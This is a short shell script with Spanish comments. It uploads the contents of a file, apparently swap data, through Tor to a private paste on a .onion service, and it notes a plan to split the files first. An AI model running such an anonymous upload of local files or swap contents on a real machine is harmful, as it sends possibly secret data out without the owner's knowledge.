#Tengo que poner que corte los archvios para luego subir cada uno de ellos la ruta de pruevas sera split /mnt/pruevas/swap
#split $1 
torsocks curl -d private=1 -d name=Herbert --data-urlencode text@$1 http://ypbnurlwfis7xsei.onion/api/create
